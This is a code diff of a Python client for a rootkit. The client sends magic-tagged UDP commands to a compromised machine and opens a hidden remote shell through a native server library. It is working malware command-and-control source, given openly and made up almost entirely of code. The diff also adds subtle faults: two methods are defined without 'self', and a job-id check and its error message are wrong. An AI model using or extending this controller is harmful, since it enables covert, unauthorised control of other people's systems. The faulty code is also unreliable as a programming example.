@@ -10,13 +10,13 @@ from typing import Dict, Optional
 from pathlib import Path
 
 JOB_ID_SIZE = 2
+MAX_JOB_ID = 2 ** (JOB_ID_SIZE * 8) - 1
 REQUEST_PORT = 1111
 MAGIC = b'mrk'
 SOCK_TIMEOUT = 0.1
 
-#SERVER_SO i= Path(__file__).parent.parent / 'usermode' / 'server.so'
-#print(Path(__file__).parent.parent)
-SERVER = cdll.LoadLibrary('/home/yanayg/MyRootkit/usermode/server.so')
+SERVER_SO = Path(__file__).parent / 'usermode' / 'server.so'
+SERVER = cdll.LoadLibrary(str(SERVER_SO))
 
 
 class CommandType(Enum):
@@ -46,41 +46,45 @@ class Client:
 
     def bind(self, remote):
         self._remote = remote
+        self._sock.connect((self._remote, REQUEST_PORT))
 
     def start(self):
         self._thread.start()
 
-    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
+    def _get_job_id():
+        return random.randint(0, MAX_JOB_ID)
+
+    def sendto(self, remote: str, command: CommandType, argument: str = '', *, timeout: Optional[float] = None, _job_id: Optional[int] = None):
         assert self._thread.is_alive(), 'client must be started before sending'
         # TODO: Switch to randbytes in python 3.9
-        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
+        job_id = _job_id or self._get_job_id()
+        assert 0 < job_id < MAX_JOB_ID and isinstance(job_id, int), f"invalid job id, must be a {JOB_ID_SIZE} bit unsigned integer"
         # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
         msg = MAGIC + struct.pack('H', job_id) + command.value + argument.encode('ascii')
         self._sock.sendto(msg, (remote, REQUEST_PORT))
         return self._await_response(job_id, timeout)
 
-    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None):
-        return self.sendto(self._remote, command, argument, timeout=timeout)
+    def send(self, command: CommandType, argument: str = '', *, timeout: Optional[float] = None, _job_id: Optional[int] = None):
+        return self.sendto(self._remote, command, argument, timeout=timeout, _job_id=_job_id)
 
     def open_shell(self, *, timeout: Optional[float] = None):
-        assert self._thread.is_alive(), 'client must be started before sending'
-        # TODO: Switch to randbytes in python 3.9
-        job_id = random.randint(0, 2 ** (JOB_ID_SIZE * 8) - 1)
-        # TODO: ascii is kinda limiting, add support in the rootkit for another encoding.
-        prefix = struct.pack('H', job_id)
-        self._sock.sendto(MAGIC + prefix + CommandType.SHELL.value, (self._remote, REQUEST_PORT))
-        res = self._await_response(job_id, timeout)
+        job_id = self._get_job_id()
+        # Start the hidden communication stream.
+        res = self.send(CommandType.SHELL, timeout=timeout, _job_id=job_id)
         if res is None:
             print('timed out')
             return res
+        # Stop looking for responses so we don't interfere.
+        self._stop_thread()
+        # Open shell on hidden connection with the same job_id.
+        _open_shell(self._sock, struct.pack('H', job_id))
+
+    def _stop_thread():
         self._should_stop = True
         self._thread.join()
-        self._sock.connect((self._remote, REQUEST_PORT))
-        _open_shell(self._sock, prefix)
 
     def close(self):
-        self._should_stop = True
-        self._thread.join()
+        self._stop_thread()
         self._sock.close()
 
     def _submit_response(self, job_id: int, status: int) -> None:
